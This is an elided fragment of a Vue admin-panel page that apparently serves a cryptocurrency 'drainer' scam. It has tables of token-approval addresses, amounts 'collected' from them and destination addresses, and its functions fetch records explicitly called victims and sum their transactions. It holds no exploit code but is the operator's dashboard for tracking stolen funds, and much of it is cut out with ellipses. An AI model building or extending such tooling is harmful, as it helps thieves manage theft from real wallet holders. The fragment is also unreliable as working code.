...
<!--        </el-form-item>-->
	   ...
	   <el-form-item align="left" label="结束日期" width="180">
        ...
        <el-form-item>
		 ...
		 <el-form-item>总量：{{amount}}</el-form-item>
      </el-form>
    </div>
...
<!--        <el-button type="primary" icon="plus" @click="openDialog('addApi')">新增</el-button>-->
      ...
      <el-table :data="tableData" @sort-change="sortChange" @selection-change="handleSelectionChange">
       ...
       <el-table-column align="left" label="授权地址" min-width="200" prop="approvalAddress" sortable="custom" >
       ...
       <el-table-column align="left" label="归集金额" min-width="80" prop="withdrawAmount" sortable="custom" />
	  ...
	  <!-- <el-table-column align="center" label="状态" min-width="180"  sortable="custom" >
       ...
       <el-table-column align="left" label="币种" min-width="80" prop="token" sortable="custom" />
		 ...
		 <el-table-column align="left" label="到账地址" min-width="150" prop="toAddress" sortable="custom" />
		  ...
		  <el-table-column align="left" label="刷新次数" min-width="100" prop="" sortable="custom"/>
...
const GetVictimdata=async(row) => {
	const res =await GetVictimById({id:row.ID})
	console.log(res)
	row=res.data.victim;
	}
// 查询
const getTableData = async() => {
  const table = await getSumVictimTxList({ page: page.value, pageSize: pageSize.value, ...searchInfo.value })
  if (table.code === 0) {
    tableData.value = table.data.list
    total.value = table.data.total
    page.value = table.data.page
    pageSize.value = table.data.pageSize
	amount.value=table.data.amount
  }
}
